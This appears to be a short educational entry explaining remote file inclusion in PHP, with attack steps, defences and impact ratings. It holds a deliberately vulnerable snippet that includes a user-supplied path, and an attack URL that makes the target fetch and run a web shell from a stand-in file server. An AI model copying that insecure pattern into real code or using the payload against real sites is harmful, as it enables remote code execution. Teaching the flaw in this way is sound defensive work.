<p align="center"> <img src="https://raw.githubusercontent.com/qeeqbox/remote-file-inclusion/main/remote-file-inclusion.png"></p>

A threat actor may trick a vulnerable target to include/retrieve remote file

## Example #1
1. A threat actor uploads a PHP web shell to a temporary file service
2. A threat actor sends a malicious request that includes the remote file name to a vulnerable target
3. The vulnerable target executes malicious files as PHP

## Code
#### Target-Logic
```php

#allow_url_include = On

<?php
  $file = $_GET["file"];
  include $file;
?>
```

#### Target-In
```
http://vulnerable.test/index.php?file=http://fileserver.test/shell.php
```

#### Target-Out
```
root
```

## Impact
High

## Names
- Remote file inclusion
- RFI

## Risk
- Read & Write data
- Command Execution

## Redemption
- Input validation
- Whitelist

## ID
cb60059e-846f-40df-9dbd-e687e8d6960a

## References
- [Wikipedia](https://en.wikipedia.org/wiki/file_inclusion_vulnerability)
